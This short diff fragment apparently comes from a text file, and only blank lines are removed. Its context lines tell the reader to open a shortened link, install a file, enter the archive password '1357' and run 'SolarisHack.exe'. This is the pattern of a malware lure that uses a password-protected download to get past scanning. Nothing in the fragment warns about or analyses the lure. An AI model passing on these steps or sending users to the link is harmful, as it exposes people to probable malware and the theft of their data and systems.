@@ -20,5 +20,3 @@
 click here: https://sul.su/LTSE and install file.
 password: 1357
 Run SolarisHack.exe
-
-
